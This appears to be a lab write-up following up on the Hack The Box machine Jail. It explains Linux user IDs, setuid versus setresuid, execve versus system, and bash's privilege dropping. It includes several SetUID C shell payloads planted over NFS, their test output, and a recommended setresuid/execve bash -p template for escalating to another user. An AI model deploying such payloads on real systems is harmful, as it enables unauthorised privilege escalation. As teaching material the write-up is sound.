In looking through writeups for Jail after finishing mine, I came across
an interesting rabbit hole, which led me down the path of a good deal of
research, where I learned interesting detail related to a few things
I've been using for years. I'll dive into Linux user IDs and SetUID /
SUID, execve vs system, and sh vs bash, and test out what I learn on
Jail.

## Background

### Issue From Jail

On Jail, I am able to get both a shell as nobody and NFS access. With
that NFS access, I can write a SetUID binary as Frank and then execute
it to get a shell as frank. I used [this
payload](/htb-jail.md#nfs-setuid):



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        setresuid(1000, 1000, 1000);
        system("/bin/bash");
        return 0;
    }



I didn't think much of it at the time, but I got a bit lucky. I noticed
in [IppSec's
walkthrough](https://www.youtube.com/watch?v=80-73OYcrrk&t=2040s) that
he had some issues with this, and very similar payload:



    int main(void)
    {
        setuid(1000);
        setgid(1000);
        system("id");
    }



When he runs this, even as a SUID binary owned by frank (user id 1000),
it shows the nobody user.

Most other writeups I looked at used the same payload I did, without any
explanation. Many also used `execve("/bin/bash", NULL, NULL)` instead of
`system` (which is safer).

This all inspired me to go into a bit of a rabbit hole, and it turns out
there are a few interesting details of how Linux act under the hood that
I learned. To follow this, I'll need background on three different
areas:

-   Linux user ids;
-   Starting processes in Linux, `execve` vs`system`;
-   `sh`, `bash`, and dropping privileges.

### Linux User IDs

#### ruid, euid, suid

Every linux process tracks three userids. The real user ID (`ruid`, or
often referred to as just `uid`) is the id of the user who started the
process.

The effective user ID (`euid`) is what the system looks to when deciding
what privileges the process should have. In most cases, the `euid` will
be the same as the `ruid`, but a SetUID binary is an example of a case
where they differ. When a SetUID binary starts, the `euid` is set to the
owner of the file, which allows these binaries to function.

The saved user ID (`suid`, not to be confused with a SUID binary, which
is short hand for SetUID binaries) is used when a privileged process
(most cases running as root) needs to drop privileges to do some
behavior, but needs to then come back to the privileged state.

If a non-root process wants to change it's `euid`, it can only set it to
the current values of `ruid`, `euid`, or `suid`. The `suid` allows a
user to start a SetUID process as root, and then that process can drop
to a non-privileged user, and still return to root.

#### set\*uid

On first look, it's easy to think that the system calls `setuid` would
set the `ruid`. In fact, when for a privileged process, it does. But in
the general case, it actually sets the `euid`. From the [man
page](https://man7.org/linux/man-pages/man2/setuid.2.md):

> setuid() sets the effective user ID of the calling process. If the
> calling process is privileged (more precisely: if the process has the
> CAP_SETUID capability in its user namespace), the real UID and saved
> set-user-ID are also set.

So in the case where you're running `setuid(0)` as root, this is sets
all the ids to root, and basically locks them in (because `suid` is 0,
it loses the knowledge or any previous user - of course, root processes
can change to any user they want).

Two less common syscalls, `setreuid` (`re` for real and effective) and
`setresuid` (`res` includes saved) set the specific ids. Being in an
unprivileged process limits these calls (from [man
page](https://man7.org/linux/man-pages/man2/setresuid.2.md) for
`setresuid`, though the
[page](https://man7.org/linux/man-pages/man2/setreuid.2.md) for
`setreuid` has similar language):

> An unprivileged process may change its real UID, effective UID, and
> saved set-user-ID, each to one of: the current real UID, the current
> effective UID, or the current saved set-user-ID.
>
> A privileged process (on Linux, one having the CAP_SETUID capability)
> may set its real UID, effective UID, and saved set- user-ID to
> arbitrary values.

It's important to remember that these aren't here as a security feature,
but rather reflect the intended workflow. When a program wants to change
to another user, it changes the effective userid so it can act as that
user.

As an attacker, it's easy to get in a bad habit of just calling `setuid`
because the most common case is to go to root, and in that case,
`setuid` is effectively the same as `setresuid`.

### Execution

#### execve (and other execs)

The `execve` system call executes a program specified in the first
argument. The second and third arguments are arrays, the arguments
(`argv`) and the environment (`envp`). There are several other system
calls that are based on `execve`, referred to as `exec` ([man
page](https://man7.org/linux/man-pages/man3/exec.3.md)). They are each
just wrappers on top of `execve` to provide different shorthands for
calling `execve`.

There's a ton of detail on the [man
page](https://man7.org/linux/man-pages/man2/execve.2.md), for how it
works. In short, when `execve` starts a program, it uses the same memory
space as the calling program, replacing that program, and newly
initiating the stack, heap, and data segments. It wipes out the code for
the program and writes the new program into that space.

So what happens to `ruid`, `euid`, and `suid` on a call to `execve`? It
does not change the metadata associated with the process. The man page
explicitly states:

> The process's real UID and real GID, as well as its supplementary
> group IDs, are unchanged by a call to execve().

There's a bit more nuance to the `euid`, with a longer paragraph
describing what happens. Still, it's focused on if the new program has
the SetUID bit set. Assuming that isn't the case, then the `euid` is
also unchanged by `execve`.

The `suid` is copied from the `euid` when `execve` is called:

> The effective user ID of the process is copied to the saved set-
> user-ID; similarly, the effective group ID is copied to the saved
> set-group-ID. This copying takes place after any effective ID changes
> that occur because of the set-user-ID and set-group-ID mode bits.

#### system

`system` is a [completely different
approach](https://man7.org/linux/man-pages/man3/system.3.md) to
starting a new process. Where `execve` operates at the process level
within the same process, `system` uses `fork` to create a child process
and then executes in that child process using `execl`:

> <div>
>
> <div>
>
>     execl("/bin/sh", "sh", "-c", command, (char *) NULL);
>
> </div>
>
> </div>

`execl` is just a wrapper around `execve` which converts string
arguments into the `argv` array and calls `execve`. It's important to
note that `system` uses `sh` to call the command.

### sh and bash SUID

`bash` has a `-p` option, which the [man
page](https://linux.die.net/man/1/bash) describes as:

> Turn on *privileged* mode. In this mode, the **\$ENV** and
> **\$BASH_ENV** files are not processed, shell functions are not
> inherited from the environment, and the **SHELLOPTS**, **BASHOPTS**,
> **CDPATH**, and **GLOBIGNORE** variables, if they appear in the
> environment, are ignored. If the shell is started with the effective
> user (group) id not equal to the real user (group) id, and the **-p**
> option is not supplied, these actions are taken and the effective user
> id is set to the real user id. If the **-p** option is supplied at
> startup, the effective user id is not reset. Turning this option off
> causes the effective user and group ids to be set to the real user and
> group ids.

In short, without `-p`, `euid` is set to `ruid` when Bash is run. `-p`
prevents this.

The `sh` shell doesn't have a feature like this. The [man
page](https://man7.org/linux/man-pages/man1/sh.1p.md) doesn't mention
"user ID", other than with the `-i` option, which says:

> -i Specify that the shell is interactive; see below. An implementation
> may treat specifying the -i option as an error if the real user ID of
> the calling process does not equal the effective user ID or if the
> real group ID does not equal the effective group ID.

## Testing On Jail

### setuid / system

With all of that background, I'll take this code and walk through what
happens on Jail:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        setuid(1000);
        system("id");
        return 0;
    }



This program is compiled and set as SetUID on Jail over NFS:



    oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
    ...[snip]...
    oxdf@hacky$ chmod 4755 /mnt/nfsshare/a



As root, I can see this file:



    [root@localhost nfsshare]# ls -l a 
    -rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a



When I run this as nobody, `id` runs as nobody:



    bash-4.2$ $ ./a
    uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0



The program starts with a `ruid` of 99 (nobody) and an `euid` of 1000
(frank). When it reaches the `setuid` call, those same values are set.

Then `system` is called, and I would expect to see `uid` of 99, but also
an `euid` of 1000. Why isn't there one? The issue is that `sh` is
symlinked to `bash` in this distribution:



    $ ls -l /bin/sh
    lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash



So `system` calls `/bin/sh sh -c id`, which is effectively
`/bin/bash bash -c id`. When `bash` is called, with no `-p`, then it
sees `ruid` of 99 and `euid` of 1000, and sets `euid` to 99.

### setreuid / system

To test that theory, I'll try replacing `setuid` with `setreuid`:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        setreuid(1000, 1000);
        system("id");
        return 0;
    }



Compile and permissions:



    oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b



Now on Jail, now `id` returns uid of 1000:



    bash-4.2$ $ ./b
    uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0



The `setreuid` call set both `ruid` and `euid` to 1000, so when `system`
called `bash`, they matched, and things continued as frank.

### setuid / execve

Calling `execve` If my understanding above is correct, I could also not
worry about messing with the uids, and instead call `execve`, as that
will carry though the existing IDs. That will work, but there are traps.
For example, common code might look like this:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        setuid(1000);
        execve("/usr/bin/id", NULL, NULL);
        return 0;
    }



Without the environment (I'm passing NULL for simplicity), I'll need a
full path on `id`. This works, returning what I expect:



    bash-4.2$ $ ./c
    uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0



The `[r]uid` is 99, but the `euid` is 1000.

If I try to get a shell from this, I have to be careful. For example,
just calling `bash`:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        setuid(1000);
        execve("/bin/bash", NULL, NULL);
        return 0;
    }



I'll compile that and set it SetUID:



    oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
    oxdf@hacky$ chmod 4755 /mnt/nfsshare/d



Still, this will return all nobody:



    bash-4.2$ $ ./d
    bash-4.2$ $ id
    uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0



If it were `setuid(0)`, then it would work fine (assuming the process
had permission to do that), as then it changes all three ids to 0. But
as a non-root user, this just sets the `euid` to 1000 (which is already
was), and then calls `sh`. But `sh` is `bash` on Jail. And when `bash`
starts with `ruid` of 99 and `euid` of 1000, it will drop the `euid`
back to 99.

To fix this, I'll call `bash -p`:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        char *const paramList[10] = {"/bin/bash", "-p", NULL};
        setuid(1000);
        execve(paramList[0], paramList, NULL);
        return 0;
    }



This time the `euid` is there:



    bash-4.2$ $ ./e
    bash-4.2$ $ id
    uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0



Or I could call `setreuid` or `setresuid` instead of `setuid`.

## Conclusion

The fact is, for most cases, all of this nuance doesn't matter. If it's
SetUID for root, `setuid` does what I want. If `sh` isn't symlinked to
`bash`, I don't have to worry about dropping privs. Still, it's good to
understand what's happening in a program like this. I would recommend,
based on this research, using the basic SUID code, updating the program
/ parameters to be call as well as the id:



    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>

    int main(void) {
        char *const paramList[10] = {"/bin/bash", "-p", NULL};
        const int id = 1000;
        setresuid(id, id, id);
        execve(paramList[0], paramList, NULL);
        return 0;
    }



`setresuid` with `execve` leaves the least room for unexpected behavior.
